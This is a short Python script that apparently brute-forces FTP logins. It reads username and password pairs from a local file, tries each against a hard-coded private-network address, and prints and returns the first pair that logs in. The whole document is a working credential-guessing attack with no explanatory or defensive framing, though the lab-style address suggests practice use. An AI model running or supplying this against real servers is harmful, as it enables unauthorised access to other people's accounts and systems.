import ftplib
import socket
def anonlog(host):
	
	pf = open("password.txt",'r')

	for line in pf.readlines():
		username = line.split(':')[0]
		password = line.split(':')[1].strip('\r').strip('\n')
		print("Trying in the user: "+username)
		
		try:
			ftp = ftplib.FTP(host)
			ftp.login(username,password)
			print("FTP login successfull: "+username+": "+password)
			ftp.quit()
			return (username,password)
		except:
			pass
host = "192.168.222.149"
anonlog(host)
